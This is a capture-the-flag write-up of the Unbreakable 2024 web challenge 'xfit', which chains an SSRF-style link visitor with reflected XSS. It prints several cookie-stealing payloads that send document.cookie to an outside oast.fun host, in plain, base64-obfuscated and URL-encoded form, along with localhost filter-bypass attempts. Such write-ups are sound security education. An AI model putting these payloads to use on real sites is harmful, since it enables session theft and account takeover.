---
title: xfit
type: writeup
date: 2024-04-07T14:23:28+03:00
description: Writeup for xfit [Unbreakable 2024]
author: H0N3YP0T
tags:
- web
draft: false
---
___

## DISCLAIMER

This challenge was not solved during the competition, but we were really close of the solution and spend a lot of time on it. We decided to write a writeup to
describe our approach and the solution we found after the competition.

## Challenge Description

Picture this: within the vast expanse of the digital realm, lies a crucial secret vault—a clandestine cache known as cookies. But beware, for these digital treasures are not scattered haphazardly. No, they are meticulously guarded within the confines of their respective domains, each one a sentinel of its cyber kingdom. It's a thrilling saga of hidden treasures and guarded gateways, where the very essence of your online identity hangs in the balance!


## Intuition

The description mention subdomains and cookies. Combining these two and the name of the challenge,
I assumed I had to steal cookie by using XSS. The website is a static one with only two endpoints:
 - `/contact` which send an email (it seems only the message parameter is required)
 - `/error?err=404` which returns a 404 error page (or 500, 200, ...)

![img.png](/images/unbreakable_2024/contact.png)
![img_1.png](/images/unbreakable_2024/err.png)

Here we can see the request to the `/contact` endpoint.

![img.png](/images/unbreakable_2024/request.png)

## What we tried

First we tried to remove all parameter from the request in order to see the behavior of the website.
We noticed we received some parsing error with a findLinks function. It gave us a hint about a potential SSRF or 
CSRF vulnerability.

![img.png](/images/unbreakable_2024/parse.png)

In order to confirm that wa tried to request a server under our control with this [tool](https://app.interactsh.com/#/).

![img.png](/images/unbreakable_2024/test.png)
![img_1.png](/images/unbreakable_2024/response.png)

As we can see above we got the request which means the server is visiting the link we provided.

Going back to the error page, it seems that the error parameter is vulnerable to XSS as the following picture shows.

![img.png](/images/unbreakable_2024/xss.png)

```js
<img src=x onerror=confirm(1)>
```

Knowing that we can now steal the cookie using the following logic:
 - Send a message to the `/contact` endpoint with the following payload:
```js
http://127.0.0.1/error.html?err=<img+src=x+onerror="document.location='http://xhtfiwjfrxvxawnsmojcux2nwwez03yx3.oast.fun/?c='%2Bdocument.cookie">
```
 - Wait for the server to visit the error page
 - The admin's cookie will be sent to our server
 - Profit

![img.png](/images/unbreakable_2024/trying.png)

Unfortunately we do not receive any cookie it seems the parsing is not working as expected.

![img.png](/images/unbreakable_2024/noCookie.png)

The supposition is that the parsing ignore the first part of the URL (green part below) but 
only understand the second part as URL (blue part below). Therefore, it does not execute any javascript which
means we cannot steal the cookie.

![img.png](/images/unbreakable_2024/fail.png)

To bypass this we decided to base64 encode the second part with this payload:

```js
http://127.0.0.1/error.html?err=<img+src=x+onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly94aHRmaXdqZnJ4dnhhd25zbW9qY3V4Mm53d2V6MDN5eDMub2FzdC5mdW4vP2M9Jytkb2N1bWVudC5jb29raWU='))">
```

Unfortunately, this time, we did not receive any request on our server, so we assumed the parsing had some anti-SSRF
protection by blacklisting the localhost / 127.0.0.1 IP.

We started a lot of bypass techniques such as `http://0177.0.0.01`, `http://0x7f.0x0.0x0.0x1` and many more without success.

## Solution

We were pretty close of the actual solution but we were wrong by thinking that the parsing functions blacklisted the localhost IP.
We missed something when trying URL encoding and then base64 encoding. The correct payload was actually an URL encoded one but
apparently we did it wrong.

```js
http://localhost/error.html?err=%3Cimg%20src%3Dx%20onerror%3Ddocument%2Elocation%3D%22http%3A%2F%2Fzyeapckdjkrwivdzxeeabjaadiyukbx8f%2Eoast%2Efun%2F%3Fc%3D%22%2Bdocument%2Ecookie%3E
```

In conclusion the challenge trolled us because when we tried the correct payload with URL encoding only but,
the server either did not execute the javascript (document.cookie) or the server just crashed except 
one time for random and mysterious reason where we got the flag (after the CTF ended).

![img.png](/images/unbreakable_2024/fuck.png)


